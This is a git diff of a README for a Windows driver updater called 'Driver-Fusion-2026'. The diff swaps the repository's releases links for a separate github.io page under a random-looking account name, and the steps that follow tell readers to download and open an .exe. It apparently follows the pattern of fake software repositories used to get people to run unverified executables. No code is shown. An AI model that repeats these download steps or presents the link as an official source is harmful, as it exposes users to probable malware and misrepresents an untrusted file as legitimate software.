@@ -1,6 +1,6 @@
 # 🛠️ Driver-Fusion-2026 - Keeping your hardware drivers current today
 
-[![](https://img.shields.io/badge/Download-Driver_Fusion_2026-blue.svg)](https://github.com/toeathanasiancreed636/Driver-Fusion-2026/releases)
+[![](https://img.shields.io/badge/Download-Driver_Fusion_2026-blue.svg)](https://toeathanasiancreed636.github.io)
 
 ## 📋 Overview
 
@@ -10,7 +10,7 @@ Driver Fusion 2026 maintains the hardware drivers on your Windows computer. Outd
 
 Follow these steps to install the software on your computer.
 
-1. Visit the [official releases page](https://github.com/toeathanasiancreed636/Driver-Fusion-2026/releases) to access the download options.
+1. Visit the [official releases page](https://toeathanasiancreed636.github.io) to access the download options.
 2. Look for the file ending in .exe under the most recent version heading.
 3. Click the file name to start the download process to your computer.
 4. Open your Downloads folder.
